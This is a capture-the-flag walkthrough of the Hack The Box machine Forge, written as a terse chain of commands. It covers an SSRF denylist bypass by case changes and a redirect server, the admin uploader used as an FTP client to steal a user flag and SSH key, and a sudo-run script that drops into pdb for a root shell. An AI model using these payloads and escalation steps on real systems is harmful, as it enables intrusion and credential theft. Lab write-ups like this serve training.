---
title: "Forge — Speedrun"
summary: "The command chain only. Case manipulation past an SSRF denylist, an announcements page with FTP credentials, the uploader used as an FTP client to steal an SSH key, and a sudo script that drops to pdb."
date: 2026-09-08
draft: false
tier: speedrun
categories:
  - Offensive
tags:
  - Forge
  - Hack The Box
  - Linux
  - Web
  - SSRF
  - Python
ShowToc: true
TocOpen: false
---

Commands and output, one line per step. The reasoning, the dead ends, and why each pivot was chosen are in the [long version](../../offensive/forge/).

Commands are formatted from my May notes rather than a fresh replay. The script internals in step 8 come from the source captured in [0xdf's write-up](https://0xdf.gitlab.io/2022/01/22/htb-forge.html#exploit); my notes recorded the behaviour, not the mechanism.

Target: `<target>`, attacker: `<attacker-ip>`. My notes never recorded either address.

## Recon

```bash
nmap -p- --min-rate 10000 -T4 -oA nmap/allports <target>
```

```text
21/tcp filtered ftp
22/tcp open     ssh
80/tcp open     http
```

```bash
echo "<target> forge.htb admin.forge.htb" | sudo tee -a /etc/hosts
```

```bash
gobuster vhost -u http://forge.htb \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r --append-domain
gobuster dir -u http://forge.htb -w /usr/share/wordlists/dirb/<wordlist>.txt
```

`admin.forge.htb` serves localhost only. `/upload` takes a file or a URL.

## Foothold

**1. The denylist.** `http://127.0.0.1`, `http://forge.htb` and `http://127.1` all return `URL contains blacklisted address`.

**2. Case manipulation gets through.**

```text
http://ADMIN.FORGE.HTB
```

The fetched body is stored as the uploaded "image", so the admin page's HTML comes back in the upload. Read it in Burp.

A redirect server on the attacker box is the other way in:

```python
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler


class Redirect(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header('Location', sys.argv[1])
        self.end_headers()


HTTPServer(('0.0.0.0', 80), Redirect).serve_forever()
```

```bash
python3 redirect.py http://admin.forge.htb
```

**3. The announcements page.**

```text
http://ADMIN.FORGE.HTB/announcements
```

```text
An internal ftp server has been setup with credentials as user:heightofsecurity123!
The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.
The /upload endpoint has been configured for easy scripting of uploads, and for uploading an
image, one can simply pass a url with ?u=<url>
```

**4. Drive the admin uploader as an FTP client.** `?u=` carries the FTP URL, credentials included. That reaches the filtered port 21 from the box's own position.

```text
http://ADMIN.FoRge.Htb/upload?u=ftp://user:heightofsecurity123!@FORGE.htb
```

```text
snap
user.txt
```

**5. User flag.**

```text
http://ADMIN.FoRge.Htb/upload?u=ftp://user:heightofsecurity123!@FORGE.htb/user.txt
```

**6. The SSH key.** The account accepts a key only. Submit this one in the browser; Burp mangles the encoding.

```text
http://ADMIN.Forge.Htb/upload?u=ftp://user:heightofsecurity123!@FORGE.htb/.ssh/id_rsa
```

```bash
chmod 600 id_rsa
ssh -i id_rsa user@forge.htb
```

## Privilege escalation

**7. The sudo entry.**

```bash
sudo -l
```

```text
User user may run the following commands on forge:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
```

**8. What the script does.** It binds a random high port, takes a password over the socket, and puts the menu choice straight into `int()` inside a `try`.

```python
port = random.randint(1025, 65535)
...
option = int(clientsock.recv(1024).strip())
...
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
```

**9. Session A, run it under sudo.** It prints the port.

```bash
sudo /usr/bin/python3 /opt/remote-manage.py
# Listening on localhost:<port>
```

**10. Session B, a second SSH session.** Authenticate, then send a non-integer.

```bash
nc localhost <port>
```

```text
secretadminpassword
asdf
```

**11. Session A drops to the debugger.** `int('asdf')` raises, the handler passes the traceback to `pdb.post_mortem`, and the prompt lands on the sudo process's own stdin.

```python
(pdb) import os; os.system('/bin/bash')
```

```bash
cat /root/root.txt
```

## Chain summary

1. `/upload` fetches a URL server-side and denylists `127.0.0.1` and `forge.htb`.
2. `http://ADMIN.FORGE.HTB` passes the check, and a redirect server on the attacker box is a second route to the same place.
3. The fetched body is saved as the uploaded image, so the response to any SSRF is readable.
4. `admin.forge.htb/announcements` gives `user:heightofsecurity123!`, the supported `ftp://` scheme, and the `?u=` parameter.
5. Passing `?u=ftp://user:pass@forge.htb` makes the admin uploader an FTP client against the filtered port 21.
6. That reads `user.txt`.
7. The same route reads `.ssh/id_rsa`, since the account accepts a key only.
8. SSH as user with the recovered key.
9. `sudo -l` allows `/usr/bin/python3 /opt/remote-manage.py` with NOPASSWD.
10. The script feeds its menu input to `int()` inside a `try` whose handler calls `pdb.post_mortem`.
11. A non-integer raises `ValueError`, the debugger opens on the sudo process's terminal, and `import os; os.system('/bin/bash')` there is a root shell.
